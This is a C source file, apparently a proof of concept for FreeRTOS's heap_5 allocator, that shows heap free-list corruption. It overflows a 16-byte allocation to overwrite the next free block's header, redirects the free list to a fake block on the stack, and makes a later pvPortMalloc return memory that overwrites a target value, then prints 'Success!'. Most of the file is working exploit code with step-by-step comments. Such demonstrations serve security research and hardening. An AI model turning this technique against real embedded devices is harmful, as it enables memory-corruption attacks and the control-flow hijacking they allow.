#include <stdio.h>
#include <pthread.h>

/* Kernel includes. */
#include "FreeRTOS.h"
#include "task.h"
#include "timers.h"
#include "semphr.h"

/* Local includes. */
#include "console.h"

#define mainHEAP_SEND_TASK_PRIORITY       ( tskIDLE_PRIORITY + 1 )

#define P1_ALLOC_SIZE   16                  /* Size of vulnerable allocation */
#define P2_ALLOC_SIZE   16                  /* Size of attacker controlled allocation */

typedef struct TARGET_BLOCK_LINK
{
    struct TARGET_BLOCK_LINK * pxNextFreeBlock; /**< The next free block in the list. */
    size_t xBlockSize;                          /**< The size of the free block. */
    void * pxTarget;                            /** The target word of memory we're looking to change */
} TargetBlockLink_t;

typedef struct A_BLOCK_LINK
{
    struct A_BLOCK_LINK * pxNextFreeBlock; /**< The next free block in the list. */
    size_t xBlockSize;                     /**< The size of the free block. */
} BlockLink_t;

/*-----------------------------------------------------------*/

static void prvHeapTask( void * pvParameters );


/*-----------------------------------------------------------*/

static void prvInitializeHeap( void )
{
	/* Place the first block of the heap memory in the first bank of RAM. */
    static struct ordered_heaps
    {
        uint8_t ucHeap1[ configTOTAL_HEAP_SIZE ];

        /* Place the second block of the heap memory in the second bank of RAM. */
        uint8_t ucHeap2[ 16 * 1024 ];
    } xHeaps;

	/* Memory regions are defined in address order, and terminate with NULL. */
	static HeapRegion_t xHeapRegions[] =
	{
		{ ( unsigned char * ) xHeaps.ucHeap1, sizeof( xHeaps.ucHeap1 ) },
		{ ( unsigned char * ) xHeaps.ucHeap2, sizeof( xHeaps.ucHeap2 ) },
		{ NULL,                        0                 }
	};

	vPortDefineHeapRegions( xHeapRegions );

	return;
}

void main_heap( void )
{
    /* Initialize heap_5 */
    prvInitializeHeap();
    // Create heap task
    xTaskCreate( prvHeapTask, "Heap", configMINIMAL_STACK_SIZE, NULL, mainHEAP_SEND_TASK_PRIORITY, NULL );


    /* Start the tasks and timer running. */
    vTaskStartScheduler();

    /* If all is well, the scheduler will now be running, and the following
     * line will never be reached.  If the following line does execute, then
     * there was insufficient FreeRTOS heap memory available for the idle and/or
     * timer tasks	to be created.  See the memory management section on the
     * FreeRTOS web site for more details. */
    for( ; ; )
    {
    }
}
/*-----------------------------------------------------------*/

static void prvDumpHeap() {
    HeapStats_t HeapStats;
    vPortGetHeapStats( &HeapStats );

    console_print( "\n=========== HEAP DUMP =========\n");
    console_print( "xAvailableHeapSpaceInBytes: 0x%zx\n", HeapStats.xAvailableHeapSpaceInBytes );
    console_print( "xSizeOfLargestFreeBlockInBytes: 0x%zx\n", HeapStats.xSizeOfLargestFreeBlockInBytes );
    console_print( "xSizeOfSmallestFreeBlockInBytes: 0x%zx\n", HeapStats.xSizeOfSmallestFreeBlockInBytes );
    console_print( "xNumberOfFreeBlocks: %zu\n", HeapStats.xNumberOfFreeBlocks );
    console_print( "xMinimumEverFreeBytesRemaining: 0x%zx\n", HeapStats.xMinimumEverFreeBytesRemaining );
    console_print( "xNumberOfSuccessfulAllocations: %zu\n", HeapStats.xNumberOfSuccessfulAllocations );
    console_print( "xNumberOfSuccessfulFrees: %zu\n", HeapStats.xNumberOfSuccessfulFrees );
    console_print( "\n----- Free-list -----\n");
//    vPortDumpHeap(&console_print);
    console_print( "\n");
}

static void prvHeapTask( void * pvParameters )
{
    uint8_t *p1, *p2;
    uint8_t *overflow;
    TargetBlockLink_t target;

    console_print( "Initial heap at start:");
    prvDumpHeap();
    p1 = pvPortMalloc(P1_ALLOC_SIZE);
    console_print( "p1 ptr @%p\n", p1 );
    // as a new allocation p1 now points to a allocated buffer, followed by a heap block on the freelist
    // We will overwrite this to modify our target on the stack...

    // There are some preconditions in the "heap block" memory before our target to avoid a SEGFAULT due to block splitting.
    // Either:
    //   1 - pxNextFreeBlock has a value > &target
    //   2 - xBlockSize is > the next malloc() size AND < the malloc() size + sizeof(BlockLink_t)

    // Case 1:
    target.pxNextFreeBlock =  &target + 0xFF;
    target.xBlockSize = 0xFFFFFFFF;  // Doesn't matter
    // Case 2:
    // target.pxNextFreeBlock =  0x0;  // Doesn't matter
    // target.xBlockSize = P2_ALLOC_SIZE + sizeof(BlockLink_t);

    // Target to overwrite
    target.pxTarget = 0xDEADBEEF;
    console_print( "target @%p\n", &target );
    console_print( "initial target value %p\n", target.pxTarget );

    // Write past end of p1 allocation, i.e. due to a buffer overflow
    overflow = p1 + P1_ALLOC_SIZE;
    // Overwrite the freelist block!
    // Set a small size so this will be skipped by malloc()
    ((BlockLink_t *)overflow)->xBlockSize = 4;
    // Point the next block at our target (which must meet the preconditions above)
    ((BlockLink_t *)overflow)->pxNextFreeBlock = (BlockLink_t *)&target;

    // console_print( "Heap after overflow:");
    // prvDumpHeap(); // This can segfault

    // This next allocation will be redirected by the overflow of the p1 heap region
    // and the insertion of an attacker controlled heap block into the freelist
    p2 = pvPortMalloc(P2_ALLOC_SIZE);

    // This write would normally simply set a value the newly allocated heap block, but
    // due to the overflow it will actually overwrite target.pxTarget on the stack.
    (*(uint32_t*)p2) = 0x55;

    console_print( "attacker controlled p2 ptr @%p\n", p2 );
    console_print( "exploited target value %p\n", target.pxTarget );
    if ( target.pxTarget == 0x55 ) {
        console_print( "Success!\n" );
    }
    vTaskDelete(NULL);
}
